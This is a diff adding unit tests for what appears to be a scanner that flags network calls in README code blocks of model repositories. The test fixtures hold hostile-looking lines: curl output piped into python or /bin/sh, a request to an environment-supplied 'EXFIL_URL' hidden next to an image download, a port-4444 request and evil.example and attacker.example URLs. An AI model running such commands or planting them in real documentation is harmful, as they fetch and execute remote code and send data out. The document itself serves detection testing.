@@ -521,6 +521,33 @@ image = Image.open(requests.get("https://attacker.example/track.jpg").raw)
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_suspicious_port_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+requests.get("https://images.cocodataset.org:4444/x.jpg")
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "suspicious_port"
+        and check.details.get("port") == 4444
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_call(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
@@ -750,6 +777,37 @@ curl https://evil.example/payload
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_session_client(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+from requests import Session
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+image = requests.get(url)
+Session().get(os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_socket_connect(
     tmp_path: Path,
 ) -> None:
@@ -826,6 +884,31 @@ curl http://localhost:8080/v1/embeddings | /bin/sh
         check.name == "Network Communication Detection"
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "http://localhost:8080/v1/embeddings"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_loopback_api_python_pipe_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl http://localhost:8080/v1/payload | python
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/payload"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
